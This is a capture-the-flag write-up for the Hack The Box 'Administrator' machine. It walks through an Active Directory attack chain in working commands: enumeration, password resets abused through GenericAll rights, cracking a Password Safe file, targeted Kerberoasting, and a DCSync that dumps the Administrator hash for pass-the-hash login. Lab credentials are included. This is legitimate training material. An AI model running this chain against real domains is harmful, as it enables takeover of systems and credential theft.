# HTB - Administrator

**IP Address:** `10.10.11.42`  
**OS:** Windows  
**Difficulty:** Hard  
**Tags:** #SMB, #WinRM, #BloodHound, #ShadowCredentials, #RPC, #PasswordCracking, 
#DCSync

**Extra initial information:**
- User: olivia
- Password: ichliebedich

---

## 1. Initial Enumeration

### 1.1 Ping

```bash
ping 10.10.11.42
```

✅ Host is up

---

### 1.2 Port Scanning

Basic port scan:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.42 -oG allPorts
```

Deeper scan with script and XML output:

```bash
nmap -p21,53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49668,51918,54283,54288,54302,54310 -sCV 10.10.11.42 -oN targeted -oX targetedXML
```

---

## 2. SMB and WinRM Access

```bash
crackmapexec smb 10.10.11.42
```

Edit `/etc/hosts` to map the domain:

```
10.10.11.42 administrator.htb
```

Verified user login with NetExec:

```bash
netexec smb 10.10.11.42 -u olivia -p ichliebedich
```

Login success, but user is not in the **Remote Management Users** group.

However, WinRM is open:

```bash
evil-winrm -i 10.10.11.42 -u olivia -p 'ichliebedich'
```

✅ Access as `olivia`

---

## 3. Enumeration

List users:

```bash
net user
```

RPC enumeration using Olivia’s credentials:

```bash
rpcclient -U "olivia%ichliebedich" 10.10.11.42
```

Dump domain users:

```bash
rpcclient -U "olivia%ichliebedich" 10.10.11.42 -c 'enumdomusers' > users.txt
cat users.txt | grep -oP '\[.*?\]' | grep -v "0x" | tr -d '[]' | sponge users.txt
```

Checked AS-REP roasting:

```bash
GetNPUsers.py -no-pass -usersfile users.txt administrator.htb/
```

No users were vulnerable.

---

## 4. BloodHound + LDAPDomainDump

Install BloodHound:

```bash
wget https://github.com/SpecterOps/bloodhound-cli/releases/latest/download/bloodhound-cli-linux-amd64.tar.gz
tar -xvzf bloodhound-cli-linux-amd64.tar.gz
./bloodhound-cli install
```

Dump LDAP data:

```bash
ldapdomaindump -u 'administrator.htb\olivia' -p ichliebedich 10.10.11.42
```

Access domain HTML data via a local web server.

Collect BloodHound data:

```bash
bloodhound-python -u 'olivia' -p 'ichliebedich' -c All --zip -ns 10.10.11.42 -d administrator.htb
```

Discovered a **GenericAll** relationship from `olivia` to `michael`.

---

## 5. Lateral Movement

Change `michael`’s password via NetExec or RPC:

```bash
net rpc password "michael" "newP@ssword2022" -U "administrator.htb"/"olivia"%"ichliebedich" -S 10.10.11.42
```

Used BloodHound to confirm `michael` can reset `benjamin`’s password as well:

```bash
net rpc password "benjamin" "newP@ssword2022" -U "administrator.htb"/"michael"%"newP@ssword2022" -S 10.10.11.42
```

---

## 6. File Access via SMB and FTP

Access shared files using `benjamin`:

```bash
smbmap -H 10.10.11.42 -u benjamin -p 'newP@ssword2022' -r
```

Discovered interesting file via FTP:

```bash
ftp 10.10.11.42
get Backup.psafe3
```

The file is a **Password Safe** database.

---

## 7. Cracking Password Safe

Used `pwsafe`:

```bash
pwsafe Backup.psafe3
```

Extracted hash using `pwsafe2john` and cracked with rockyou:

```bash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

✅ Password: `tekieromucho`

Logged into pwsafe and found credentials for user `emily`.

---

## 8. Privilege Escalation via Kerberoasting

Logged in as `emily` via WinRM:

```bash
evil-winrm -i 10.10.11.42 -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
```

Used **targetedKerberoast.py**:

```bash
python3 targetedKerberoast.py -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' -d administrator.htb --dc-ip 10.10.11.42
```

Cracked Ethan's TGS hash:

```bash
john hash_ethan --wordlist=/usr/share/wordlists/rockyou.txt
```

✅ Password: `limpbizkit`

---

## 9. DCSync Attack → Domain Admin

Performed DCSync using Ethan’s credentials:

```bash
secretsdump.py administrator.htb/ethan:limpbizkit@10.10.11.42
```

✅ Retrieved Administrator NTLM hash

Logged in as Administrator:

```bash
evil-winrm -i 10.10.11.42 -u administrator -H 3dc553ce4b9fd20bd016e098d2d2fd2e
```

✅ Root access obtained  
🏁 **Root flag retrieved**

---

# ✅ MACHINE COMPLETE
